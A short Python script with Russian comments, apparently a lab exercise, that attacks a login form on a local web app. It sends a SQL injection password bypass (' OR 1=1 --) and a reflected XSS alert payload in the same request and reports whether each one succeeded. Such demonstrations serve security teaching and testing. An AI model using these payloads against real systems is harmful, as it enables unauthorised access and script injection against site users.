import requests

URL = "http://127.0.0.1:5000/"

def run_exploit():
    print("[*] Запускаем атаку на приложение...")

    # 1. Эксплуатируем SQL-инъекцию (обходим проверку пароля без знания '67676767')
    # 2. В поле username передаем XSS-нагрузку
    xss_payload = "<script>alert('HACKED_BY_XSS')</script>"
    sqli_payload = "' OR 1=1 --"

    data = {
        "username": xss_payload,
        "password": sqli_payload
    }

    response = requests.post(URL, data=data)

    # Проверяем, сработала ли SQL-инъекция (появилось ли большое 67)
    if ">67</h1>" in response.text:
        print("[+] УСПЕХ (SQL Injection): Пароль успешно обойден! Получен доступ к секретному '67'.")
    else:
        print("[-] Провал SQLi.")

    # Проверяем, сработала ли XSS (вернулся ли наш тег <script> в чистом виде)
    if xss_payload in response.text:
        print(f"[+] УСПЕХ (Reflected XSS): Вредоносный скрипт внедрен в страницу: {xss_payload}")
    else:
        print("[-] Провал XSS.")

if __name__ == "__main__":
    run_exploit()
